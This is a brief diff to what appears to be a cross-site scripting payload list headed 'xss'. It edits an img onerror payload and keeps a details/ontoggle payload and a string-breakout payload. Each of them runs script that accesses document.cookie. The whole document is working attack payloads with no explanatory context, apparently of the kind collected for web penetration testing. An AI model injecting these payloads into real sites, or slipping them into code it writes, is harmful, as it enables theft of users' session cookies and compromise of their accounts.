@@ -1,5 +1,5 @@
 # xss
-"><Img Src=OnXSS OnError=alert(document.cookie)>
+<Img Src=OnXSS OnError=alert(document.cookie)>
 
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 ';alert(document.cookie);//
